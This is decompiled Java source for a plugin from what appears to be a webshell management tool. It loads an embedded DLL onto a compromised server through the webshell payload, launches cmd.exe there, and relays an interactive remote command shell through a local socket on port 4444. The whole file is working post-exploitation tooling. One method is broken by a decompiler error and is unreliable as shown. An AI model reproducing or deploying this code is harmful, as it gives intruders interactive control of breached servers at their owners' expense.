package shells.plugins.cshap;

import com.kitfox.svg.Stop;
import core.Encoding;
import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Arrays;
import javax.swing.JButton;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTextField;
import util.Log;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;

@PluginAnnotation(Name = "CRevlCmd", payloadName = "CShapDynamicPayload")
public class RealCmd implements Plugin {
    private static final String CLASS_NAME = "RevlCmd.Run";
    private JButton StartButton = new JButton("Start");
    private JButton StopButton = new JButton("Stop");
    private ArrayList<Socket> clients = new ArrayList<>();
    private Encoding encoding;
    private JLabel execFileLabel = new JLabel("可执行文件路径");
    private JTextField execFileTextField = new JTextField("cmd.exe", 30);
    private JLabel hostLabel = new JLabel("绑定本地Host :");
    private JTextField hostTextField = new JTextField("127.0.0.1", 15);
    private boolean loadState;
    private JSplitPane meterpreterSplitPane = new JSplitPane();
    private JPanel panel = new JPanel(new BorderLayout());
    private Payload payload;
    private JLabel pollingSleepLabel = new JLabel("延迟(ms)");
    private JTextField pollingSleepTextField = new JTextField("1000", 7);
    private JLabel portLabel = new JLabel("绑定本地Port :");
    private JTextField portTextField = new JTextField("4444", 7);
    private ShellEntity shellEntity;
    private RTextArea tipTextArea = new RTextArea();

    public RealCmd() {
        this.meterpreterSplitPane.setOrientation(0);
        this.meterpreterSplitPane.setDividerSize(0);
        JPanel meterpreterTopPanel = new JPanel();
        meterpreterTopPanel.add(this.pollingSleepLabel);
        meterpreterTopPanel.add(this.pollingSleepTextField);
        meterpreterTopPanel.add(this.execFileLabel);
        meterpreterTopPanel.add(this.execFileTextField);
        meterpreterTopPanel.add(this.hostLabel);
        meterpreterTopPanel.add(this.hostTextField);
        meterpreterTopPanel.add(this.portLabel);
        meterpreterTopPanel.add(this.portTextField);
        meterpreterTopPanel.add(this.StartButton);
        meterpreterTopPanel.add(this.StopButton);
        this.meterpreterSplitPane.setTopComponent(meterpreterTopPanel);
        this.meterpreterSplitPane.setBottomComponent(new JScrollPane(this.tipTextArea));
        this.panel.add(this.meterpreterSplitPane);
    }

    private void StartButtonClick(ActionEvent actionEvent) {
        load();
        try {
            ServerSocket serverSocket = new ServerSocket(Integer.parseInt(this.portTextField.getText().trim()), 1, InetAddress.getByName(this.hostTextField.getText().trim()));
            Socket client = serverSocket.accept();
            this.clients.add(client);
            new runCmd(client, this.payload, this.execFileTextField.getText().trim(), this.pollingSleepTextField);
            serverSocket.close();
        } catch (Exception e) {
            Log.error(e);
            JOptionPane.showMessageDialog(getView(), e.getMessage(), "提示", 2);
        }
    }

    private void StopButtonClick(ActionEvent actionEvent) {
        load();
        ReqParameter reqParameter = new ReqParameter();
        reqParameter.add("action", Stop.TAG_NAME);
        byte[] result = this.payload.evalFunc(CLASS_NAME, "xxx", reqParameter);
        if (result.length == 1 && (result[0] == 255 || result[0] == -1)) {
            JOptionPane.showMessageDialog(getView(), "stop ok", "提示", 1);
        } else {
            JOptionPane.showMessageDialog(getView(), "fail", "提示", 2);
        }
    }

    private void load() {
        if (!this.loadState) {
            try {
                InputStream inputStream = getClass().getResourceAsStream("assets/RevlCmd.dll");
                byte[] data = functions.readInputStream(inputStream);
                inputStream.close();
                if (this.payload.include(CLASS_NAME, data)) {
                    this.loadState = true;
                    Log.log("Load success", new Object[0]);
                    return;
                }
                Log.log("Load fail", new Object[0]);
            } catch (Exception e) {
                Log.error(e);
            }
        }
    }

    @Override // core.imp.Plugin
    public void init(ShellEntity shellEntity2) {
        this.shellEntity = shellEntity2;
        this.payload = this.shellEntity.getPayloadModel();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        automaticBindClick.bindJButtonClick(this, this);
    }

    /*  JADX ERROR: MOVE_RESULT instruction can be used only in fallback mode
        jadx.core.utils.exceptions.CodegenException: MOVE_RESULT instruction can be used only in fallback mode
        	at jadx.core.codegen.InsnGen.fallbackOnlyInsn(InsnGen.java:604)
        	at jadx.core.codegen.InsnGen.makeInsnBody(InsnGen.java:542)
        	at jadx.core.codegen.InsnGen.makeInsn(InsnGen.java:230)
        	at jadx.core.codegen.InsnGen.addWrappedArg(InsnGen.java:119)
        	at jadx.core.codegen.InsnGen.addArg(InsnGen.java:103)
        	at jadx.core.codegen.InsnGen.generateMethodArguments(InsnGen.java:806)
        	at jadx.core.codegen.InsnGen.makeInvoke(InsnGen.java:746)
        	at jadx.core.codegen.InsnGen.makeInsnBody(InsnGen.java:367)
        	at jadx.core.codegen.InsnGen.makeInsn(InsnGen.java:249)
        	at jadx.core.codegen.InsnGen.makeInsn(InsnGen.java:217)
        	at jadx.core.codegen.RegionGen.makeSimpleBlock(RegionGen.java:110)
        	at jadx.core.codegen.RegionGen.makeRegion(RegionGen.java:56)
        	at jadx.core.codegen.RegionGen.makeSimpleRegion(RegionGen.java:93)
        	at jadx.core.codegen.RegionGen.makeRegion(RegionGen.java:59)
        	at jadx.core.codegen.MethodGen.addRegionInsns(MethodGen.java:244)
        	at jadx.core.codegen.MethodGen.addInstructions(MethodGen.java:237)
        	at jadx.core.codegen.ClassGen.addMethodCode(ClassGen.java:342)
        	at jadx.core.codegen.ClassGen.addMethod(ClassGen.java:295)
        	at jadx.core.codegen.ClassGen.lambda$addInnerClsAndMethods$2(ClassGen.java:264)
        	at java.util.stream.ForEachOps$ForEachOp$OfRef.accept(ForEachOps.java:184)
        	at java.util.ArrayList.forEach(ArrayList.java:1257)
        	at java.util.stream.SortedOps$RefSortingSink.end(SortedOps.java:390)
        	at java.util.stream.Sink$ChainedReference.end(Sink.java:258)
        */
    private void closePlugin() {
        /*
            r2 = this;
            java.util.ArrayList<java.net.Socket> r0 = r2.clients
            java.util.stream.Stream r0 = r0.stream()
            r1 = move-result
            r0.forEach(r1)
            return
        */
        throw new UnsupportedOperationException("Method not decompiled: shells.plugins.cshap.RealCmd.closePlugin():void");
    }

    private static /* synthetic */ void lambda$closePlugin$0(Socket socket) {
        if (!socket.isClosed()) {
            try {
                socket.close();
            } catch (IOException e) {
                Log.error(e);
            }
        }
    }

    @Override // core.imp.Plugin
    public JPanel getView() {
        return this.panel;
    }

    class runCmd {
        JTextField pollingSleepTextField;
        Socket socketx;

        public runCmd(Socket socket, Payload payload, String execFile, JTextField pollingSleepTextField2) {
            try {
                this.socketx = socket;
                this.pollingSleepTextField = pollingSleepTextField2;
                final OutputStream outputStream = socket.getOutputStream();
                final InputStream inputStream = socket.getInputStream();
                ReqParameter reqParameter = new ReqParameter();
                reqParameter.add("action", "start");
                reqParameter.add("execFile", execFile);
                outputStream.write(payload.evalFunc(RealCmd.CLASS_NAME, "xxx", reqParameter));
                new Thread(new Runnable(RealCmd.this) {
                    /* class shells.plugins.cshap.RealCmd.runCmd.AnonymousClass1 */

                    public void run() {
                        runCmd.this.IO(inputStream);
                    }
                }).start();
                Thread.sleep(5000);
                new Thread(new Runnable(RealCmd.this) {
                    /* class shells.plugins.cshap.RealCmd.runCmd.AnonymousClass2 */

                    public void run() {
                        runCmd.this.LO(outputStream);
                    }
                }).start();
            } catch (Exception e) {
                Log.error(e);
                try {
                    this.socketx.close();
                } catch (IOException e2) {
                    Log.error(e);
                }
            }
        }

        public void IO(InputStream inputStream) {
            byte[] data = new byte[5120];
            while (true) {
                try {
                    int readNum = inputStream.read(data);
                    if (readNum != -1 && !this.socketx.isClosed()) {
                        ReqParameter reqParameter = new ReqParameter();
                        reqParameter.add("action", "processWriteData");
                        reqParameter.add("processWriteData", Arrays.copyOf(data, readNum));
                        byte[] result = RealCmd.this.payload.evalFunc(RealCmd.CLASS_NAME, "xxx", reqParameter);
                        if (result.length == 1 && result[0] == -1) {
                            this.socketx.close();
                            return;
                        }
                    } else {
                        return;
                    }
                } catch (Exception e) {
                    try {
                        this.socketx.close();
                        return;
                    } catch (IOException e2) {
                        Log.error(e);
                        return;
                    }
                }
            }
        }

        public void LO(OutputStream outputStream) {
            while (!this.socketx.isClosed()) {
                try {
                    int sleepTime = Integer.parseInt(this.pollingSleepTextField.getText().trim());
                    Thread.sleep(sleepTime > 500 ? (long) sleepTime : 500);
                    ReqParameter reqParameter = new ReqParameter();
                    reqParameter.add("action", "getResult");
                    byte[] result = RealCmd.this.payload.evalFunc(RealCmd.CLASS_NAME, "xxx", reqParameter);
                    if (result.length == 1 && result[0] == -1) {
                        this.socketx.close();
                        return;
                    } else if (result.length != 2 || result[0] != 45 || result[1] != 49) {
                        outputStream.write(result);
                    }
                } catch (Exception e) {
                    try {
                        this.socketx.close();
                        return;
                    } catch (IOException e2) {
                        Log.error(e);
                        return;
                    }
                }
            }
        }
    }
}
